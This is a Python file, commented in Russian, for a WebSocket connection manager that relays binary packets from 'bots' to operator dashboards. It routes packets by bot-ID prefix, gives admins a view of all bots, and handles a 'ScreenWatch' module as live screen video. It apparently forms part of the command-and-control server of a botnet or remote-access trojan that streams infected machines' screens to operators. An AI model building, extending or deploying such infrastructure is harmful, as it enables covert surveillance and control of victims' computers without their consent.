import asyncio
from logs import Log as logger

class ConnectionManager:
    def __init__(self):
        self.active_connections = {} # {login: [ws]}
        self.tunnels = {}           # {prefix: [ws]}
        self.queues = {}            # {ws: Queue}
        self.send_tasks = {}
        self.bot_prefix_cache = {}  # {raw_id_bytes: prefix_str}

    async def connect(self, ws, login, user):
        await ws.accept()
        # Ограничиваем очередь, чтобы не «душить» память при лагах фронтенда
        queue = asyncio.Queue(maxsize=100)
        self.queues[ws] = queue
        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))
        
        self.active_connections.setdefault(login, []).append(ws)
        prefix = user.get("prefix", "NONE")
        
        self.tunnels.setdefault(prefix, []).append(ws)
        if user.get("role") == "admin":
            self.tunnels.setdefault("ALL", []).append(ws)
            
        logger.info(f"[API] [+] {login} подключен к туннелю (Префикс: {prefix})")

    async def _socket_writer(self, ws, queue):
        """Фоновый воркер для отправки данных в WebSocket без блокировки основного цикла."""
        try:
            while True:
                packet = await queue.get()
                await ws.send_bytes(packet)
                queue.task_done()
        except Exception:
            pass
        finally:
            logger.debug("[API] Writer task terminated")

    def disconnect(self, ws, login):
        if ws in self.send_tasks:
            self.send_tasks[ws].cancel()
            del self.send_tasks[ws]
        
        self.queues.pop(ws, None)
        
        # Чистим ws изо всех списков
        for group in self.active_connections.values():
            if ws in group: group.remove(ws)
        for group in self.tunnels.values():
            if ws in group: group.remove(ws)

    def broadcast_packet_sync(self, packet: bytes):
        """
        Рассылка пакета ботов на фронтенд. 
        Оптимизировано под видео-стриминг.
        """
        try:
            if len(packet) < 6: return

            id_len, mod_len = packet[0], packet[1]
            raw_id = packet[6:6 + id_len]
            
            # Быстрая проверка модуля (ScreenWatch — это видео)
            module_bytes = packet[6 + id_len : 6 + id_len + mod_len]
            is_video = b"ScreenWatch" in module_bytes

            # Кэширование префикса бота (ua4e1-Bot -> ua4e1)
            prefix = self.bot_prefix_cache.get(raw_id)
            if not prefix:
                try:
                    bot_id_str = raw_id.decode(errors='ignore')
                    prefix = bot_id_str.split('-')[0] if '-' in bot_id_str else "NONE"
                    # Ограничиваем размер кэша, чтобы избежать утечки памяти
                    if len(self.bot_prefix_cache) > 1000: self.bot_prefix_cache.clear()
                    self.bot_prefix_cache[raw_id] = prefix
                except:
                    prefix = "NONE"

            # Сбор всех получателей: те, кто следит за этим префиксом + админы (ALL)
            targets = set(self.tunnels.get(prefix, [])) | set(self.tunnels.get("ALL", []))

            for ws in targets:
                q = self.queues.get(ws)
                if not q: continue
                
                if is_video: 
                    # Для видео: удаляем старые кадры, если очередь забита (Real-time приоритет)
                    while q.full():
                        try: q.get_nowait()
                        except asyncio.QueueEmpty: break
                
                try:
                    q.put_nowait(packet)
                except asyncio.QueueFull:
                    pass # Если это не видео и очередь полна — пропускаем пакет, чтобы не вешать сервер
        except Exception as e:
            # logger.error(f"Broadcast error: {e}") # Раскомментируй для отладки
            pass